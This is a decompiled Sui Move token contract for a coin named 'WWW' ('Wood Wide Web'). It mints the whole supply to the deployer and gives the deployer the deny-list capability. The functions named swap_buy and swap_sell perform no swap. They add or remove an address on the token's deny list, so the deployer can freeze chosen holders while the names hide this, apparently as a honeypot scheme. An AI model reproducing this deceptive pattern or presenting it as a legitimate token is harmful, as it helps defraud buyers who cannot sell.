module 0xec258e099674e8351b39bf6023f436089add778132b1cf0caea59b70aa43b5b1::www {
    struct WWW has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: WWW, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WWW>(arg0, 9, b"WWW", b"Wood Wide Web", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmasXS5NNYWbAhYyX6fziNY3DxZqYM9uSfAY3q3FTCVGtd"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<WWW>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WWW>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<WWW>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WWW>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WWW>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WWW>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WWW>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WWW>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

